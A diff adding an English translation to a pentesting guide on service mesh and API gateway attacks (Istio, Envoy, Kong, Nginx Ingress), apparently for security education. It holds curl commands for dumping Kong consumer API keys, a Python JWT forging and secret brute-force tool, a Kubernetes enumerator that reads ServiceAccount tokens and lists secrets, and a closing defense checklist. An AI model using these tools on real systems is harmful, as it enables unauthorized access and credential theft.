@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # 서비스 메시 및 API 게이트웨이 공격
 
 ## 개요
@@ -476,3 +482,486 @@ spec:
 | Envoy 관리 포트 노출 | NetworkPolicy로 15000포트 차단 |
 | JWT 약한 시크릿 | 256비트 이상 랜덤 시크릿 |
 | Kong Admin API 노출 | Admin API 외부 접근 차단 |
+
+---
+
+<a name="english"></a>
+
+# Service Mesh and API Gateway Attacks
+
+## Overview
+
+In microservice environments, service meshes (Istio, Linkerd) and API gateways (Kong, AWS API Gateway, Nginx Ingress) are the backbone of traffic control. Misconfigurations at this layer can lead to authentication bypass between services, authorization bypass, SSRF, and more.
+
+---
+
+## Istio Service Mesh Architecture
+
+```
+External Traffic
+    │
+    ▼
+[Istio Ingress Gateway]
+    │
+    ▼
+[Sidecar Proxy (Envoy)]  ←→  [Istio Control Plane (istiod)]
+    │
+    ▼
+[Application Pod]
+```
+
+### Istio Key Components
+
+| Component | Role |
+|-----------|------|
+| Envoy Proxy | Injected as sidecar, handles all traffic |
+| istiod (Pilot) | Configuration distribution, certificate management |
+| PeerAuthentication | mTLS policy |
+| AuthorizationPolicy | Inter-service access control |
+| VirtualService | Traffic routing rules |
+
+---
+
+## Istio Attack Vectors
+
+### 1. mTLS Bypass (PeerAuthentication Not Configured)
+
+```bash
+# Check mTLS configuration
+kubectl get peerauthentication -A
+
+# PERMISSIVE mode (vulnerable): allows both mTLS and plaintext
+# STRICT mode (secure): allows mTLS only
+
+# Check PERMISSIVE configuration
+kubectl get peerauthentication -A -o yaml | grep mode
+
+# Test direct service access from Pod without sidecar
+# (Without sidecar, no mTLS cert → blocked in STRICT mode)
+kubectl run test-pod --image=curlimages/curl -it --rm \
+  --labels="sidecar.istio.io/inject=false" \
+  -- curl http://target-service.namespace.svc.cluster.local:8080/api
+```
+
+### 2. AuthorizationPolicy Bypass
+
+```yaml
+# Example of misconfigured AuthorizationPolicy (exploitable by attacker)
+apiVersion: security.istio.io/v1beta1
+kind: AuthorizationPolicy
+metadata:
+  name: allow-get-only
+spec:
+  selector:
+    matchLabels:
+      app: target-service
+  action: ALLOW
+  rules:
+  - to:
+    - operation:
+        methods: ["GET"]
+# Problem: POST, PUT etc. default to DENY,
+# but if no other AuthorizationPolicy exists, everything is ALLOW
+```
+
+```bash
+# When misconfigured: spoof source IP by manipulating X-Forwarded-For header
+curl -H "X-Forwarded-For: 10.0.0.1" \
+  http://target-service/internal/admin
+
+# Review all AuthorizationPolicies
+kubectl get authorizationpolicy -A -o yaml
+```
+
+### 3. Envoy Management Port Exposure Detection
+
+When the Envoy sidecar management ports (15000, 15001) are exposed externally:
+
+```bash
+# Access Envoy admin API from inside Pod (internal only)
+kubectl exec -it TARGET_POD -- curl http://localhost:15000/
+
+# Extract cluster information
+kubectl exec -it TARGET_POD -- curl http://localhost:15000/clusters
+
+# Config dump (may include certificates)
+kubectl exec -it TARGET_POD -- curl http://localhost:15000/config_dump
+
+# Check dynamic configuration
+kubectl exec -it TARGET_POD -- curl http://localhost:15000/listeners
+
+# If management port is exposed on ClusterIP
+kubectl get svc -A | grep 15000
+```
+
+---
+
+## API Gateway Attacks
+
+### Kong Gateway Vulnerabilities
+
+```bash
+# Check if Admin API is publicly exposed (default port 8001)
+curl http://GATEWAY_IP:8001/
+
+# Plugin list (check authentication settings)
+curl http://GATEWAY_IP:8001/plugins
+
+# Exfiltrate service/route list
+curl http://GATEWAY_IP:8001/services
+curl http://GATEWAY_IP:8001/routes
+
+# Consumer (credential) list
+curl http://GATEWAY_IP:8001/consumers
+
+# Steal API keys
+curl http://GATEWAY_IP:8001/consumers/USER/key-auth
+
+# If Kong validates JWT - try algorithm confusion attack
+# "alg": "none" or switch HS256 → RS256
+```
+
+### Nginx Ingress Attacks
+
+```bash
+# Namespace isolation bypass - Ingress annotation injection
+# Vulnerable config: user input reflected in annotations
+
+# List all Ingresses
+kubectl get ingress -A -o yaml
+
+# Subdomain takeover (dangling DNS)
+# Domain of a deleted Ingress still remains in DNS
+
+# Check annotations allowed by NGINX Ingress
+kubectl get configmap -n ingress-nginx nginx-configuration -o yaml
+```
+
+### JWT Validation Vulnerabilities
+
+```python
+#!/usr/bin/env python3
+"""JWT vulnerability tester - alg confusion and weak secret detection"""
+
+import base64
+import hashlib
+import hmac
+import json
+import sys
+from pathlib import Path
+
+
+def decode_jwt_without_verify(token: str) -> tuple[dict, dict]:
+    parts = token.split(".")
+    if len(parts) != 3:
+        raise ValueError("Invalid JWT format")
+
+    def b64decode(s: str) -> bytes:
+        s += "=" * (4 - len(s) % 4)
+        return base64.urlsafe_b64decode(s)
+
+    header = json.loads(b64decode(parts[0]))
+    payload = json.loads(b64decode(parts[1]))
+    return header, payload
+
+
+def try_none_algorithm(token: str) -> str:
+    """alg=none attack: disable signature verification"""
+    parts = token.split(".")
+
+    header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
+    header["alg"] = "none"
+
+    new_header = base64.urlsafe_b64encode(
+        json.dumps(header, separators=(",", ":")).encode()
+    ).rstrip(b"=").decode()
+
+    return f"{new_header}.{parts[1]}."  # empty signature
+
+
+def try_weak_secret(token: str, wordlist_path: Path) -> str | None:
+    """Brute-force weak secret key"""
+    parts = token.split(".")
+    message = f"{parts[0]}.{parts[1]}"
+    expected_sig_b64 = parts[2]
+
+    def b64decode_sig(s: str) -> bytes:
+        s += "=" * (4 - len(s) % 4)
+        return base64.urlsafe_b64decode(s)
+
+    expected_sig = b64decode_sig(expected_sig_b64)
+
+    with open(wordlist_path, "r", errors="ignore") as f:
+        for line in f:
+            secret = line.strip()
+            computed = hmac.new(
+                secret.encode(),
+                message.encode(),
+                hashlib.sha256,
+            ).digest()
+            if computed == expected_sig:
+                return secret
+    return None
+
+
+def forge_jwt(payload: dict, secret: str, algorithm: str = "HS256") -> str:
+    """Forge JWT (when weak secret is found)"""
+    header = {"alg": algorithm, "typ": "JWT"}
+
+    def b64encode(data: dict) -> str:
+        return base64.urlsafe_b64encode(
+            json.dumps(data, separators=(",", ":")).encode()
+        ).rstrip(b"=").decode()
+
+    h = b64encode(header)
+    p = b64encode(payload)
+    message = f"{h}.{p}"
+
+    if algorithm == "HS256":
+        sig = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
+        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
+        return f"{message}.{sig_b64}"
+
+    raise ValueError(f"Unsupported algorithm: {algorithm}")
+```
+
+---
+
+## Python: Kubernetes API Enumeration Tool
+
+```python
+#!/usr/bin/env python3
+"""
+Kubernetes API Enumerator - privilege enumeration using ServiceAccount tokens
+Usage: python3 k8s_enum.py --token TOKEN --server https://K8S_API:6443
+"""
+
+import argparse
+import json
+import ssl
+import sys
+import urllib.request
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from dataclasses import dataclass, field
+
+
+@dataclass
+class K8sClient:
+    server: str
+    token: str
+    verify_ssl: bool = False
+
+    def request(self, path: str) -> dict | list | None:
+        url = f"{self.server.rstrip('/')}{path}"
+        headers = {
+            "Authorization": f"Bearer {self.token}",
+            "Accept": "application/json",
+        }
+        ctx = ssl.create_default_context()
+        if not self.verify_ssl:
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+
+        try:
+            req = urllib.request.Request(url, headers=headers)
+            with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
+                return json.loads(resp.read())
+        except urllib.error.HTTPError as e:
+            if e.code == 403:
+                return None  # no permission
+            return None
+        except Exception:
+            return None
+
+
+@dataclass
+class ClusterInfo:
+    namespaces: list[str] = field(default_factory=list)
+    pods: list[dict] = field(default_factory=list)
+    secrets: list[dict] = field(default_factory=list)
+    service_accounts: list[dict] = field(default_factory=list)
+    services: list[dict] = field(default_factory=list)
+    clusterroles: list[dict] = field(default_factory=list)
+
+
+def enumerate_cluster(client: K8sClient) -> ClusterInfo:
+    info = ClusterInfo()
+
+    print("[*] Enumerating namespaces...")
+    ns_data = client.request("/api/v1/namespaces")
+    if ns_data:
+        info.namespaces = [
+            item["metadata"]["name"]
+            for item in ns_data.get("items", [])
+        ]
+        print(f"  [+] Namespaces: {len(info.namespaces)}")
+    else:
+        print("  [-] Namespace access denied (using defaults)")
+        info.namespaces = ["default", "kube-system"]
+
+    def fetch_namespace_resources(ns: str) -> dict:
+        result = {"ns": ns, "pods": [], "secrets": [], "sas": [], "svcs": []}
+
+        pod_data = client.request(f"/api/v1/namespaces/{ns}/pods")
+        if pod_data:
+            result["pods"] = [
+                {
+                    "name": p["metadata"]["name"],
+                    "ns": ns,
+                    "node": p["spec"].get("nodeName", ""),
+                    "sa": p["spec"].get("serviceAccountName", "default"),
+                }
+                for p in pod_data.get("items", [])
+            ]
+
+        secret_data = client.request(f"/api/v1/namespaces/{ns}/secrets")
+        if secret_data:
+            result["secrets"] = [
+                {
+                    "name": s["metadata"]["name"],
+                    "ns": ns,
+                    "type": s.get("type", ""),
+                }
+                for s in secret_data.get("items", [])
+            ]
+
+        svc_data = client.request(f"/api/v1/namespaces/{ns}/services")
+        if svc_data:
+            result["svcs"] = [
+                {
+                    "name": s["metadata"]["name"],
+                    "ns": ns,
+                    "type": s["spec"].get("type", ""),
+                    "cluster_ip": s["spec"].get("clusterIP", ""),
+                }
+                for s in svc_data.get("items", [])
+            ]
+
+        return result
+
+    print("[*] Enumerating resources per namespace...")
+    with ThreadPoolExecutor(max_workers=5) as executor:
+        futures = {executor.submit(fetch_namespace_resources, ns): ns
+                   for ns in info.namespaces}
+        for future in as_completed(futures):
+            ns_result = future.result()
+            info.pods.extend(ns_result["pods"])
+            info.secrets.extend(ns_result["secrets"])
+            info.services.extend(ns_result["svcs"])
+
+    # Enumerate ClusterRoles
+    cr_data = client.request("/apis/rbac.authorization.k8s.io/v1/clusterroles")
+    if cr_data:
+        info.clusterroles = [
+            {"name": cr["metadata"]["name"]}
+            for cr in cr_data.get("items", [])
+            if "cluster-admin" in cr["metadata"]["name"]
+        ]
+
+    return info
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(
+        description="Kubernetes API Enumerator",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Usage examples:
+  # Use SA token (from inside Pod)
+  python3 k8s_enum.py --token $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+
+  # Use kubeconfig token from outside
+  python3 k8s_enum.py --server https://K8S_API:6443 --token TOKEN
+        """,
+    )
+    parser.add_argument("--server", default="https://kubernetes.default.svc",
+                        help="K8s API server URL")
+    parser.add_argument("--token", help="ServiceAccount JWT token")
+    parser.add_argument("--token-file", help="Path to token file")
+
+    args = parser.parse_args()
+
+    token = args.token
+    if not token and args.token_file:
+        token = open(args.token_file).read().strip()
+    if not token:
+        default_token = "/var/run/secrets/kubernetes.io/serviceaccount/token"
+        import os
+        if os.path.exists(default_token):
+            token = open(default_token).read().strip()
+            print(f"[*] Using default SA token: {default_token}")
+        else:
+            print("[-] No token: --token or --token-file required")
+            sys.exit(1)
+
+    client = K8sClient(server=args.server, token=token)
+
+    print(f"[*] K8s cluster enumeration: {args.server}")
+    info = enumerate_cluster(client)
+
+    print(f"\n{'='*60}")
+    print(f"Enumeration Results Summary")
+    print(f"{'='*60}")
+    print(f"  Namespaces: {len(info.namespaces)} — {info.namespaces}")
+    print(f"  Pods:       {len(info.pods)}")
+    print(f"  Secrets:    {len(info.secrets)}")
+    print(f"  Services:   {len(info.services)}")
+
+    if info.clusterroles:
+        print(f"\n[!] cluster-admin related ClusterRoles found!")
+        for cr in info.clusterroles:
+            print(f"    {cr['name']}")
+
+    # Detect sensitive secrets
+    sensitive_types = {"kubernetes.io/service-account-token", "Opaque"}
+    sensitive_secrets = [s for s in info.secrets if s["type"] in sensitive_types]
+    if sensitive_secrets:
+        print(f"\n[!] {len(sensitive_secrets)} sensitive secrets:")
+        for s in sensitive_secrets[:10]:
+            print(f"    {s['ns']}/{s['name']} ({s['type']})")
+
+    # Detect LoadBalancer services
+    lb_services = [s for s in info.services if s["type"] == "LoadBalancer"]
+    if lb_services:
+        print(f"\n[!] Externally exposed services (LoadBalancer): {len(lb_services)}")
+        for s in lb_services:
+            print(f"    {s['ns']}/{s['name']}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## Defense Checklist
+
+### Istio Security Configuration
+```yaml
+# Enable STRICT mTLS for the entire mesh
+apiVersion: security.istio.io/v1beta1
+kind: PeerAuthentication
+metadata:
+  name: default
+  namespace: istio-system
+spec:
+  mtls:
+    mode: STRICT
+---
+# Default DENY AuthorizationPolicy
+apiVersion: security.istio.io/v1beta1
+kind: AuthorizationPolicy
+metadata:
+  name: deny-all
+  namespace: default
+spec:
+  {}  # empty spec = deny all
+```
+
+| Vulnerability | Defense |
+|---------------|---------|
+| mTLS not configured | PeerAuthentication STRICT mode |
+| Missing AuthorizationPolicy | deny-all default policy + explicit allow |
+| Envoy management port exposed | Block port 15000 with NetworkPolicy |
+| Weak JWT secret | 256-bit+ random secret |
+| Kong Admin API exposed | Block external access to Admin API |
